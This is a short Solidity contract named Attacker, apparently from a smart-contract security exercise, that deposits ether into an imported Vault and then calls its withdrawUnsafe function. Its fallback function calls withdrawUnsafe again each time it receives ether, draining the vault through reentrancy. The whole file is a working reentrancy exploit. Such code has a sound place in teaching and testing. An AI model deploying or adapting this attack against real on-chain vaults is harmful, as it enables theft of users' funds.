// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.19;

import "Vault.sol";

interface IAttacker {
    function depositToVault(address vault) external payable;

    function attack(address vault) external;
}

contract Attacker is IAttacker {
    function depositToVault(address vault) external payable {
        IVault(vault).deposit{value: msg.value}();
    }

    fallback() external payable {
        msg.sender.call(abi.encodeWithSignature("withdrawUnsafe(address)", payable(this)));
    }

     function attack(address vault) external {
        IVault(vault).withdrawUnsafe(payable(this));
    }
}